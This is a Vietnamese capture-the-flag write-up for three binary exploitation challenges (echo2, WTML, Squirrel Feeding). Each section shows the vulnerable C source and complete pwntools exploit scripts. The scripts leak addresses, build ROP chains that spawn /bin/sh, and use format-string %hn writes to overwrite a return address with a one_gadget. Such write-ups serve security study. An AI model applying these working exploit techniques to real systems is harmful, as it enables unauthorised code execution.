# echo2

## IDA

```c
int echo()
{
  char ptr[264]; // [rsp+0h] [rbp-110h] BYREF
  int v2[2]; // [rsp+108h] [rbp-8h] BYREF

  puts("Welcome to Echo2");
  v2[1] = __isoc99_scanf("%d", v2);
  fread(ptr, 1uLL, v2[0], stdin);
  return printf("Echo2: %s\n", ptr);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  echo();
  puts("Goodbye from Echo2");
  return 0;
}
```

## Ý tưởng

- mảng v2[] được khai báo int (4byte)
- `  v2[1] = __isoc99_scanf("%d", v2);` dòng này hơi lạ, em tìm trên gpt thì em hiểu:
- hàm scanf() trả về số lượng phần tử đã được gán giá trị thành công. (ở đây là 1 (do nhập vào là số))
- và ta ghi giá trị vào v2 là con trỏ, là ta đang ghi vào v2[0]
- Như vậy, ta có thể ow được rip để điều khiển
- Do hàm này không có hàm tạo shell nên có thể là ret2libc, ta cần leak được libc, nhưng do địa chỉ động nên ta cần leak địa chỉ exe, để có got

## Thực thi

### Leak exe

- Ta sẽ ow rbp để khi %s nó sẽ luôn địa chỉ ret của echo

```python
    payload = b'a'*279
    r.sendlineafter(b'Echo2\n', b"280")
    r.send(payload)
```

- Nó sẽ leak cho ta ret của echo nhưng như vậy chưa đủ vì leak xong chương trình kết thúc
- Ta kiểm tra địa chỉ của ret echo là `0x00558efb2072b3` và main là `0x558efb207247`
- 2 địa chỉ khá giống nhau nên ta chỉ cần ghi thêm 1 byte để ghi đè ret echo thành main để khi kết thúc nó sẽ chạy lại chương trình
- Do nhảy vào đầu main có lỗi xmm1 nên ta sẽ nhảy vào main + 5 là cần ghi đè thành byte 0x4c ("L")
- Nên sửa lại payload một xíu, và tính toán exe base

```python
    payload = b'a'*279 + b"L"
    r.sendlineafter(b'Echo2\n', b"281")
    r.send(payload)

    r.recvuntil(b'a'*279)
    exe_leak = u64(r.recvline(keepends=False) + b'\0\0')
    exe.address = exe_leak - 4684
    log.info("leak exe: " + hex(exe_leak))
    log.info("base exe: " + hex(exe.address))
```

### Leak libc

- chỗ này em thắc mắc tại sao phải đưa ret vào =(( (em co script của a)

```python
    ret = exe.address + 0x000000000000101a
    payload = b'b'*279
    payload += p64(ret) + p64(exe.plt['printf'])
    payload += p64(ret) + p64(exe.sym['echo'])
    r.sendlineafter(b'Echo2\n', str((len(payload) + 1)))
    r.send(payload)

    r.recvlines(2)
    leak_libc = u64(r.recvuntil(b'Welcome', drop=True) + b"\0\0")
    libc.address = leak_libc - 401616
    log.info("leak libc: " + hex(leak_libc))
    log.info("leak libc: " + hex(libc.address))
```

### rop

- Đến đây ta có thể dùng one_gadget, tuy nhiên khi sử dụng one_gadget mặc dù đã thoả các điều kiện rồi nhưng vẫn lỗi, buộc ta phải rop bằng tay =)))
- Dùng ROPgadget trong file exe không có các pop nên ta sẽ sử dụng ROPgadget lên file libc vì nó có đầy đủ
- Ta cần pop các thanh ghi sau

```
    rsi = libc.address + 0x000000000002be51
    rdi = libc.address + 0x000000000002a3e5
    rax_rdx_rbx = libc.address + 0x0000000000090528
    syscall = libc.address + 0x0000000000029db4
```

- Cuối cùng tạo shell ta tạo shell thui

```python
    payload = b'a'*279
    payload += flat(
        rsi, 0,
        rdi, next(libc.search(b"/bin/sh")),
        rax_rdx_rbx, 0x3b, 0x0, 0x0,
        syscall
    )
    r.sendlineafter(b'Echo2\n', str((len(payload) + 1)))
    r.send(payload)
```

# WTML

## Source

```c
#include <errno.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define MESSAGE_LEN 0x20

typedef void (*tag_replacer_func)(char *message, char from, char to);

typedef struct tag_replacer {
    uint8_t id;
    tag_replacer_func funcs[2];
} __attribute__((packed)) tag_replacer;

void replace_tag_v1(char *message, char from, char to) {
    size_t start_tag_index = -1;
    for (size_t i = 0; i < MESSAGE_LEN - 2; i++) {
        if (message[i] == '<' && message[i + 1] == from && message[i + 2] == '>') {
            start_tag_index = i;
            break;
        }
    }
    if (start_tag_index == -1) return;

    for (size_t i = start_tag_index + 3; i < MESSAGE_LEN; i++) {
        if (message[i] == '<' && message[i + 1] == '/' && message[i + 2] == from) {
            size_t end_tag_index = i;
            message[start_tag_index + 1] = to;
            message[end_tag_index + 2] = to;
            return;
        }
    }
}

void replace_tag_v2(char *message, char from, char to) {
    printf("[DEBUG] ");
    printf(message);

    // TODO implement

    printf("Please provide feedback about v2: ");
    char response[0x100];
    fgets(response, sizeof(response), stdin);

    printf("Your respones: \"");
    printf(response);

    puts("\" has been noted!");
}

void prompt_tag(const char *message, char *tag) {
    puts(message);
    *tag = (char) getchar();

    if (getchar() != '\n' || *tag == '<' || *tag == '>') exit(EXIT_FAILURE);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    tag_replacer replacer = {
            .funcs = {replace_tag_v1, replace_tag_v2},
            .id = 0,
    };
    char user_message[MESSAGE_LEN] = {0};

    puts("Please enter your WTML!");
    fread(user_message, sizeof(char), MESSAGE_LEN, stdin);

    while (true) {
        // Replace tag
        char from = 0;
        prompt_tag("What tag would you like to replace [q to quit]?", &from);

        if (from == 'q') {
            exit(EXIT_SUCCESS);
        }

        char to = 0;
        prompt_tag("With what new tag?", &to);

        replacer.funcs[replacer.id](user_message, from, to);

        puts(user_message);
    }
}
```

## Ý tưởng

- Bài này khá là khó, ta có thể phát hiện lỗi bof ở đây

```c
    for (size_t i = start_tag_index + 3; i < MESSAGE_LEN; i++) {
        if (message[i] == '<' && message[i + 1] == '/' && message[i + 2] == from) {
            size_t end_tag_index = i;
            message[start_tag_index + 1] = to;
            message[end_tag_index + 2] = to;
            return;
        }
    }
```

- `MESSAGE_LEN` có giá trị là 32, `message[]` là mảng ta nhập vào, và `to` là lần nhập thứ 3, ta thấy nếu `i = MESSAGE_LEN = 31` thì

```c
            message[start_tag_index + 1] = to;
            message[end_tag_index + 2] = to;
        //  message[32] = to
        //  message[33] = to
        //  trong khi message[] phần tử ta khởi tạo chỉ đến 31
```

- Và chỗ này, hàm replace_1 được gọi

![image](https://user-images.githubusercontent.com/111769169/229436486-893c4aec-5551-4609-8021-b29b23ece187.png)

- Trong hàm replace_1 ta chương trình hoạt động như sau
- Nó sẽ kiểm tra 3 kí tự đầu của chuỗi mình nhập vào, đặc biệt là kí tự thứ 2 sẽ phải giống với lần nhập thứ 2 (from)

```c
    size_t start_tag_index = -1;
    for (size_t i = 0; i < MESSAGE_LEN - 2; i++) {
        if (message[i] == '<' && message[i + 1] == from && message[i + 2] == '>') {
            start_tag_index = i;
            break;
        }
    }
```

```c
    if (start_tag_index == -1) return; // kiểm tra
```

- Đây là bước quan trọng
- Nó sẽ thay đổi 2 kí tự, và thoát chương trình luôn, và như ở phân tích trên, ta có thể lợi dụng chỗ này để ghi đè được vì nó có thể truy cập phần tử ngoài mảng
- Ở đây ta sẽ cho payload không thoả điều kiện hàm if để khi `i = 30` khi này `i + 1 = 31, i + 2 = 32 (phần tử ngoài mảng)` có thể ghi đè byte byte 0x00 ( để puts() leak được địa chỉ)

![image](https://user-images.githubusercontent.com/111769169/229440451-88d9f863-b3a4-4ae9-abd0-d697293daa6d.png)

- Tại i = 30 payload của chúng ta cần phải `<`, i + 1 = 31 sẽ là `/`, i + 2 = 32 payload sẽ là `0x00` vì giá trị `message[32] = 0x00` chính là byte 0x00 ở hình trên

```c
    for (size_t i = start_tag_index + 3; i < MESSAGE_LEN; i++) {
        if (message[i] == '<' && message[i + 1] == '/' && message[i + 2] == from) {
            size_t end_tag_index = i;
            message[start_tag_index + 1] = to;
            message[end_tag_index + 2] = to;
            return;
        }
    }
```

- Tóm lại lần nhập thứ hai ta sẽ nhập 0x00

```python
    payload = b"<\0>"           # mục đích là chạy được vòng for đầu tiên của replace 1
    payload = payload.ljust(30) # không cho chạy vào if
    payload += b"</"            # thoả if để ghi đè để leak

    r.sendafter(b" WTML!\n", payload)
    r.sendlineafter(b" quit]?\n",  b'\0')   # lần nhập thứ 2 ta
    r.sendlineafter(b"tag?\n", b'\1')   # ghi đè 0x1 vào byte 0x0 ảnh trên
```

- Tiếp tục nó sẽ hỏi ta `What tag would you like to replace [q to quit]? và With what new tag?` ta vẫn sẽ trả lời để ở dòng call r8 tiếp theo nó sẽ đưa địa chỉ replace_2 thực hiện

```python
    r.sendlineafter(b" quit]?\n",  b'\0')
    r.sendlineafter(b"tag?\n", b'\1')
```

- Khi thực hiện được hàm replace_2, trong đó có một lỗi FMT ở dưới, vậy nghĩa là ta có thể sử dụng %p để leak các địa chỉ như stack, exe, libc

```c
    printf(message);
```

- Do là phải leak các địa chỉ, mà công cụ mình dùng leak là chuỗi ban đầu mình gửi vào nên ta sẽ cần sửa lại một xíu

```python
    payload = b'<\0>' + b'%40$p%53$p'.ljust(27, b'A') + b'</'

    r.sendafter(b" WTML!\n", payload)
    r.sendlineafter(b" quit]?\n",  b'\0')
    r.sendlineafter(b"tag?\n", b'\1')
```

- Đây là payload của em

```python
    r.recvuntil(b">")
    leak_stack = int(r.recv(14), 16)
    ret_replace_2 = leak_stack - 0x58
    leak_libc = int(r.recv(14), 16)
    libc.address = leak_libc - 147587
    log.info("leak libc & leak stack: " +
             hex(leak_libc) + " " + hex(leak_stack))
    log.info("libc base: " + hex(libc.address))
```

- ta không thể ret2win vì `fgets` đã giới hạn lại 100 kí tự, nhưng ta có fmt để thay đổi địa chỉ
- ở dòng `ret_replace_2 = leak_stack - 0x58` thì khi mà em leak được địa chỉ stack thì địa chỉ ta cần là địa chỉ stack chứa ret của rip của replace_2, offset từ địa chỉ ta leak được đến địa chỉ chứa ret là 0x58

![image](https://user-images.githubusercontent.com/111769169/229779727-d0d8209a-6243-4d8b-ac92-726e7e7859d2.png)

- dòng này đơn giản là leak_libc tính toán địa chỉ libc base

```python
    leak_libc = int(r.recv(14), 16)
    libc.address = leak_libc - 147587
    log.info("leak libc & leak stack: " +
             hex(leak_libc) + " " + hex(leak_stack))
    log.info("libc base: " + hex(libc.address))
```

- Do trong file không có hàm nào chứa `system("/bin/sh")`, nên ta sẽ ret2libc, cụ thể là one_gadget, one_gadget ta cần là `libc.sym['one_gadget'] = 0xe3b01`
- Vậy ta cần phải là ghi đè one_gadget vào rip
- Ta cần chuẩn bị một số bước

- Chỗ này lú quá, nên ta có thể coi lại video `Tấn công địa chỉ base của .fini_array` =))

```python
    package = {
        (libc.sym['one_gadget'] >> 0) & 0xffff: ret_replace_2 + 0,
        (libc.sym['one_gadget'] >> 16) & 0xffff: ret_replace_2 + 2,
        (libc.sym['one_gadget'] >> 32) & 0xffff: ret_replace_2 + 4,
    }
    order = sorted(package)
    payload = f'%{order[0]}c%20$hn'.encode()
    payload += f'%{order[1] - order[0]}c%21$hn'.encode()
    payload += f'%{order[2] - order[1]}c%22$hn'.encode()
    payload = payload.ljust(0x60, b'P')
    payload += flat(
        package[order[0]],      #địa chỉ
        package[order[1]],
        package[order[2]],
    )
    r.sendlineafter(b'about v2: ', payload)
```

## Kết quả

<details> <summary> full script </summary>

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")
libc.sym['one_gadget'] = 0xe3b01
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                   b*main+305
                   c
                   ''')
        input()
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    payload = b'<\0>' + b'%40$p%53$p'.ljust(27, b'A') + b'</'

    r.sendafter(b" WTML!\n", payload)
    r.sendlineafter(b" quit]?\n",  b'\0')
    r.sendlineafter(b"tag?\n", b'\1')

    r.sendlineafter(b" quit]?\n",  b'\0')
    r.sendlineafter(b"tag?\n", b'\1')

    r.recvuntil(b">")
    leak_stack = int(r.recv(14), 16)
    ret_replace_2 = leak_stack - 0x58
    leak_libc = int(r.recv(14), 16)
    libc.address = leak_libc - 147587
    log.info("leak libc & leak stack: " +
             hex(leak_libc) + " " + hex(leak_stack))
    log.info("libc base: " + hex(libc.address))

    package = {
        (libc.sym['one_gadget'] >> 0) & 0xffff: ret_replace_2 + 0,
        (libc.sym['one_gadget'] >> 16) & 0xffff: ret_replace_2 + 2,
        (libc.sym['one_gadget'] >> 32) & 0xffff: ret_replace_2 + 4,
    }
    order = sorted(package)
    payload = f'%{order[0]}c%20$hn'.encode()
    payload += f'%{order[1] - order[0]}c%21$hn'.encode()
    payload += f'%{order[2] - order[1]}c%22$hn'.encode()
    payload = payload.ljust(0x60, b'P')
    payload += flat(
        package[order[0]],
        package[order[1]],
        package[order[2]],
    )
    r.sendlineafter(b'about v2: ', payload)
    r.interactive()


if __name__ == "__main__":
    main()
```

</details>

# Squirrel Feeding

## Source

<details> <summary> source C </summary>

```c
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#define FEED_OPTION 1
#define VIEW_OPTION 2
#define QUIT_OPTION 3
#define MAX_NAME_LEN 16
#define BIN_COUNT 10
#define BIN_SIZE 4
#define FLAG_SQUIRREL_NAME "santa"

// Structs

typedef struct map_entry {
    char name[16];
    size_t weight;
} map_entry;

typedef struct map_data {
    size_t bin_sizes[10];
    map_entry bins[10][4];
} map_data;

typedef struct map {
    map_data *data;
    map_data local;
} map;

// Globals

map flag_map = {0};

// Functions

size_t hash_string(char *string) {
    size_t hash = 0;
    size_t len = strlen(string);
    if (len > 16)
        return 0;

    for (size_t i = 0; i < len; i++) {
        hash += string[i] * 31;
    }
    return hash;
}

void get_max_weight(map *m, char *key) {
    // TODO: implement
    // I figured I would just leave the stub in!
}

void increment(map *m, char *key, size_t amount) {
    size_t hash = hash_string(key);
    if (hash == 0)
        return;

    size_t index = hash % 10;

    for (size_t i = 0; i <= 10; i++) {
        map_entry *entry = &m->data->bins[index][i];

        // Increment existing
        if (strncmp(entry->name, key, 16) == 0) {
            entry->weight += amount;
            printf("Squirrel %s has weight %zu lbs\n", entry->name, entry->weight);
            return;
        }

        // Create new
        if (i == m->data->bin_sizes[index]) {
            strncpy(entry->name, key, 16);
            entry->weight += amount;
            if (key != "santa") printf("New squirrel %s has weight %zu lbs\n", entry->name, entry->weight);
            m->data->bin_sizes[index]++;
            // TODO: enforce that new weight does not exceed the "presidential chonk!"
            get_max_weight(&flag_map, "santa");
            return;
        }
    }
}

void print(map *map, char *key) {
    size_t hash = hash_string(key);
    if (hash == 0)
        return;

    size_t index = hash % 10;

    for (size_t i = 0; i < map->data->bin_sizes[index]; i++) {
        map_entry *entry = &map->data->bins[index][i];

        if (strncmp(entry->name, key, 16) != 0) continue;

        printf("Squirrel %s has weight %zu lbs\n", entry->name, entry->weight);
        return;
    }
}

void init_flag_map() {
    FILE *flag_file = fopen("flag.txt", "r");
    if (flag_file == NULL) {
        puts("File not found!");
        exit(EXIT_FAILURE);
    }

    char flag_text[0x100];
    fgets(flag_text, sizeof(flag_text), flag_file);
    long flag_weight = strtol(flag_text, NULL, 10);

    flag_map.data = &flag_map.local;
    increment(&flag_map, "santa", flag_weight);

    fclose(flag_file);
}

size_t i = 0;
long option = 0;
char *end_ptr = NULL;
char option_input[0x8] = {0};
char name_input[16] = {0};

void loop() {
    map m = {0};
    m.data = &m.local;

    while (i < 5) {
        puts("==============================");
        puts("What would you like to do?");
        puts("1. Feed your favorite squirrel");
        puts("2. View squirrel weight");
        puts("3. Quit");
        fputs("> ", stdout);

        fgets(option_input, sizeof(option_input), stdin);
        option = strtol(option_input, &end_ptr, 10);
        if (errno) {
            puts("Invalid option!");
            continue;
        }

        if (option == 1) {
            ++i;

            fputs("Enter their name: ", stdout);
            fgets(name_input, sizeof(name_input), stdin);

            fputs("Enter the amount to feed them: ", stdout);
            fgets(option_input, sizeof(option_input), stdin);
            option = strtol(option_input, &end_ptr, 10);
            if (errno) {
                puts("Invalid option!");
                continue;
            }

            increment(&m, name_input, option);

        } else if (option == 2) {
            fputs("Enter their name: ", stdout);

            fgets(name_input, sizeof(name_input), stdin);

            print(&m, name_input);

        } else if (option == 3) {
            break;

        } else {
            puts("Invalid option!");
        }
    }
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    puts("Welcome to the Michigan squirrel feeding simulator!");

    init_flag_map();

    loop();
}

```

</details>

## Ý tưởng

- Bài này em tham khảo wu ạ

```c
void increment(map *m, char *key, size_t amount) {
    size_t hash = hash_string(key);
    if (hash == 0)
        return;

    size_t index = hash % BIN_COUNT;

    for (size_t i = 0; i <= BIN_COUNT; i++) {
        map_entry *entry = &m->data->bins[index][i];

        // Increment existing
        if (strncmp(entry->name, key, MAX_NAME_LEN) == 0) {
            entry->weight += amount;
            printf("Squirrel %s has weight %zu lbs\n", entry->name, entry->weight);
            return;
        }

        // Create new
        if (i == m->data->bin_sizes[index]) {
            strncpy(entry->name, key, MAX_NAME_LEN);
            entry->weight += amount;
            if (key != FLAG_SQUIRREL_NAME) printf("New squirrel %s has weight %zu lbs\n", entry->name, entry->weight);
            m->data->bin_sizes[index]++;
            // TODO: enforce that new weight does not exceed the "presidential chonk!"
            get_max_weight(&flag_map, FLAG_SQUIRREL_NAME);
            return;
        }
    }
}
```

- Bài này quá lú lun ạ, đề cho ta một struct map_data chứa một biến bin_sizes kiểu size_t và một mảng 10 bins, mỗi bin có đủ không gian cho 4 mục trong bản đồ. Một mục trong bản đồ chứa 16 byte cho tên và một trọng lượng.
- `increment(&flag_map, "santa", flag_weight);.`, là mục tiêu của chúng ta tạo một mục cho con sóc santa với cờ của chúng tôi là trọng lượng trong bản đồ flag.
- Mỗi lần chúng ta muốn cho con sóc ăn, nó sẽ tăng một biến i lên 1, và khi biến đếm đạt đến 5, vòng lặp while sẽ dừng lại và chương trình sẽ thoát.
- Khi cho con sóc ăn, hàm increment trước tiên gọi hàm hash_string với name_input của chúng ta. Hàm này đơn giản là lấy mỗi ký tự của đầu vào của chúng ta, nhân nó với 31 và cộng với một tổng số. Nó trả về tổng số này được sử dụng để tạo chỉ mục sau khi lấy phần dư của tổng số băm (hash sum) cho 10 (BIN_COUNT). Biến chỉ mục này sẽ được sử dụng để quyết định con sóc của chúng ta thuộc vào thùng nào
- Mỗi thùng có đủ không gian cho 4 mục bản đồ, nhưng vòng lặp while trong hàm loop cho phép chúng ta thêm 5. Hơn nữa, hàm increment không kiểm tra xem thùng đã đầy chưa.
- Nói tóm lại,bins được khởi tạo 10 bins (chỉ số max là 9), và 4 mục (chỉ số max là 3) nhưng ta có thể truy cập đến phần tử thứ 10 `for (size_t i = 0; i <= 10; i++)` và mục thứ 4 `while (i < 5)`

```c
typedef struct map_data {
    size_t bin_sizes[10];
    map_entry bins[10][4];
} map_data;
```

## Khai thác

> do bài này em lú quá lú nên em sẽ nhìn script và giải thích ra hướng khai thác

- Thì từ lỗ hổng ta được cho ăn 5 lần ta sẽ nhập vào 5 lần như sau

```python
count = 0
for i in range(0x100):
    if (i*31) % 10 == 9:
        if count == 4:
            break
```

- Ở chỗ này ta sẽ giả lập lại cách để có được `index = 9`

```python
    if (i*31) % 10 == 9:
        if count == 4:
```

- Khi mà chạy xong 4 lần ta chú ý ở chỗ này, kiểm tra stack

![image](https://user-images.githubusercontent.com/111769169/230154649-89a9d732-6d6f-4080-b89b-91501f8692db.png)

- Mũi tên đỏ chính là rip của hàm loop
- Những gạch chân màu đó chính là tên và khối lượng chúng ta cho sóc ăn
- Và gạch màu vàng chính là lần thứ 5 ta cho ăn, khối lượng của chúng ta cho ăn có thể ghi đè được địa chỉ rip của loop, khi đó thay vì trở về main để kết thúc, nó sẽ nhảy về một hàm nào đó. (lúc em thử thì khối lượng em cho tạm là 12345)
  > đoạn này phải check stack hơi sâu ở dưới
- Kết quả sau khi ghi đè

![image](https://user-images.githubusercontent.com/111769169/230157188-6decb596-ddaf-4400-8bc3-804299be1ba9.png)

- Và mỗi khi cho ăn lúc kết thúc lần cho ăn đó, nó sẽ gọi một hàm `void get_max_weight(map *m, char *key)`
- Nó set thanh rsi là `santa`
- Trong khi đó, em thử vào option 2, nhập tên thì rsi sẽ là tên mình gửi vào và in ra cân nặng

![image](https://user-images.githubusercontent.com/111769169/230161795-94f36881-d83c-4a48-a976-3361d4de4df3.png)

- Đây là lúc ta nhảy qua `get_max_weight`

![image](https://user-images.githubusercontent.com/111769169/230162621-c3396296-8a3e-4cc1-8892-2af3b7957eaf.png)

- vậy nếu ta nhảy vảo `print` thì nó lấy địa chỉ của flag_map và tên santa

## Kết quả

### full script

```python
#!/usr/bin/python3
# script của a Trí =))

from pwn import *
exe = ELF('challenge', checksec=False)

p = process(exe.path)


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


p.pie = False

gdb.attach(p, gdbscript='''
b*increment+31
b*increment+192
b*increment+446
c
''')
input()
# Idea: Increment() has maximum index is 9 and i is 10
# But structure map_data is just 9 and 3
# typedef struct map_data {
#     size_t bin_sizes[10];
#     map_entry bins[10][4];
# } map_data;
# --> Overflow

count = 0
for i in range(0x100):
    if (i*31) % 10 == 9:
        if count == 4:
            break
        sla(b'> ', b'1')
        sla(b'name: ', p8(i) + b'\0')
        sla(b'them: ', str(i).encode())
        count += 1

# After executing increment, rdi and rsi is set so just call print()
# to get the leak
sla(b'> ', b'1')
sla(b'name: ', p8(49) + b'\0')
sla(b'them: ', str(-0x4ad).encode())
p.interactive()
```
